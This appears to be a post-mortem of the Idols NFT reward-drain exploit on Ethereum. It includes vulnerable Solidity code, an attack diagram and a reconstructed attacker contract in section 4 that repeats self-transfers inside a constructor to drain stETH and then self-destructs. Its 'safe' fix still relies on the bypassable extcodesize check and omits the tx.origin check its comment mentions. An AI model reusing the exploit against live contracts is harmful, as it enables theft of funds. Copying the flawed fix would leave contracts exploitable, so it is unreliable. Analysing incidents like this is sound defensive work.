# IdolsNFT — Duplicate Reward Acquisition via Self-Transfer Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-20 |
| **Protocol** | Idols NFT |
| **Chain** | Ethereum |
| **Loss** | ~97 stETH |
| **Attacker** | [Unidentified](https://etherscan.io/address/0x0000000000000000000000000000000000000000) |
| **Attack Tx** | [Unidentified](https://etherscan.io) |
| **Vulnerable Contract** | Idols NFT Contract (Ethereum) |
| **Root Cause** | Logic error paying rewards to both sender and receiver during `safeTransferFrom` self-transfer, and `isContract()` check bypass via contract constructor |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/IdolsNFT_exp.sol) |

---

## 1. Vulnerability Overview

The Idols NFT contract contained logic that paid stETH rewards to both the sender and receiver upon NFT transfer. When an NFT was transferred to oneself (self-transfer), this logic executed twice, allowing duplicate reward collection with no actual change in NFT ownership. Additionally, executing the attack inside a contract constructor bypassed the `Address.isContract()` check, enabling up to 2,000 repeated transfers. This resulted in the theft of 97 stETH.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: duplicate reward payout on self-transfer
function _transfer(address from, address to, uint256 tokenId) internal override {
    // Pay rewards to sender
    _claimRewards(from);
    // Pay rewards to receiver as well
    _claimRewards(to);
    super._transfer(from, to, tokenId);
}

function _claimRewards(address user) internal {
    uint256 pending = pendingRewards(user);
    if (pending > 0) {
        allocatedStethRewards -= pending;
        stETH.transfer(user, pending);
    }
}

// Problem: when from == to, _claimRewards is called twice
// + isContract() can be bypassed when called from a constructor

// ✅ Safe code: self-transfer prevention + contract address validation
function _transfer(address from, address to, uint256 tokenId) internal override {
    require(from != to, "Self-transfer not allowed");  // Block self-transfer
    require(!_isContract(to), "Contracts not allowed"); // Block contract receivers
    _claimRewards(from);
    _claimRewards(to);
    super._transfer(from, to, tokenId);
}

function _isContract(address addr) internal view returns (bool) {
    // extcodesize may be 0 during constructor execution
    // Supplement with tx.origin != addr check
    uint256 size;
    assembly { size := extcodesize(addr) }
    return size > 0;
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Deploy attack contract (attack executes in constructor)
  │         └─ During constructor execution: isContract() → false (extcodesize=0)
  │
  ├─→ [2] Loop begins inside constructor (up to 2,000 iterations)
  │         │
  │         ├─→ safeTransferFrom(self, self, tokenId=940)
  │         │     ├─ _claimRewards(self) [sender reward]
  │         │     └─ _claimRewards(self) [receiver reward] ← duplicate!
  │         │
  │         └─ rewardPerGod > allocatedStethRewards → loop exits
  │
  ├─→ [3] Accumulated stETH + NFT → transferred to attacker (tx.origin)
  │
  ├─→ [4] Contract self-destructs (selfdestruct)
  │
  └─→ [5] ~97 stETH obtained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not obtained — reconstructed from summary

contract IdolsNFTAttacker {
    address constant IDOLS_NFT = /* Idols NFT address */;
    address constant STETH = /* stETH address */;

    constructor(address attacker) {
        // Executed in constructor — bypasses isContract() check (extcodesize=0)

        // Assume tokenId 940 has been acquired
        uint256 tokenId = 940;

        // Repeat self-transfer 2,000 times
        for (uint256 i = 0; i < 2000; i++) {
            // Check if allocatedStethRewards is exhausted
            if (IIdolsNFT(IDOLS_NFT).rewardPerGod() >
                IIdolsNFT(IDOLS_NFT).allocatedStethRewards()) {
                break;
            }
            // Transfer to self → collect reward twice
            IERC721(IDOLS_NFT).safeTransferFrom(
                address(this), address(this), tokenId
            );
        }

        // Transfer accumulated stETH → to attacker
        uint256 stethBalance = IERC20(STETH).balanceOf(address(this));
        IERC20(STETH).transfer(attacker, stethBalance);

        // Return NFT as well
        IERC721(IDOLS_NFT).transferFrom(address(this), attacker, tokenId);

        // Self-destruct contract (remove evidence)
        selfdestruct(payable(attacker));
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Logic Error (duplicate reward on self-transfer) + isContract() bypass |
| **CWE** | CWE-670: Always-Incorrect Control Flow Implementation |
| **Attack Vector** | External (via contract constructor) |
| **DApp Category** | NFT / Reward Distribution |
| **Impact** | 97 ETH drained from stETH reward pool |

## 6. Remediation Recommendations

1. **Explicitly block self-transfers**: `require(from != to, "Self-transfer not allowed")`
2. **Block contract receivers**: Restrict NFT reception to EOAs (Externally Owned Accounts) only
3. **Acknowledge isContract() limitations**: Since `extcodesize` is 0 during constructor execution, additional validation (e.g., `tx.origin == msg.sender`) is required
4. **Reward payout atomicity**: Pay rewards only once per transfer, and skip reward payout when `from == to`

## 7. Lessons Learned

- Failing to explicitly handle the case where `from == to` in `safeTransferFrom` can cause duplicate payouts in reward logic.
- `Address.isContract()` has a known limitation of being bypassable during contract constructor execution and must not be used as a core security mechanism.
- When a contract is destroyed via `selfdestruct`, on-chain evidence disappears, making attack detection extremely difficult without a real-time anomaly detection system.